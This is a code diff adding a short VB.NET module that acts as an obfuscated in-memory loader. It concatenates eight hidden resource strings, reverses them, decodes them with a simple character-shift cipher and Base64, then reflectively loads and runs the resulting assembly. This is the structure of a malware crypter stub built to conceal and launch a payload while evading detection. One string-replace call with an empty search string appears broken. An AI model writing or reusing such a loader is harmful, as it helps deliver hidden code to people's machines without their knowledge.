@@ -1,0 +1,27 @@
+Module Programe
+    Public p0 As Object = My.Resources.P0
+    Public p1 As Object = My.Resources.P1
+    Public p2 As Object = My.Resources.P2
+    Public p3 As Object = My.Resources.P3
+    Public p4 As Object = My.Resources.P4
+    Public p5 As Object = My.Resources.P5
+    Public p6 As Object = My.Resources.P6
+    Public p7 As Object = My.Resources.P7
+    Dim Base As String = p0 + p1 + p2 + p3 + p4 + p5 + p6 + p7
+    Public Xd As Object = StrReverse(Base)
+    Public Hassan As Object = Xd.Replace("", "D")
+    Dim Decrypt() As Byte = Convert.FromBase64String(Dark_decrypt(Hassan))
+    Sub main(ByVal Lol() As String)
+        Dim Amiri As Object = Reflection.Assembly.Load(Decrypt)
+        Amiri.EntryPoint.Invoke(Nothing, Nothing)
+    End Sub
+    Public Function Dark_decrypt(ByVal message As String)
+        Dim key As Integer = 3
+        Dim vernome As String
+        For Each c As Char In message
+            vernome = vernome & Chr((Asc(c) - key))
+        Next
+        vernome = StrReverse(vernome)
+        Return vernome
+    End Function
+End Module
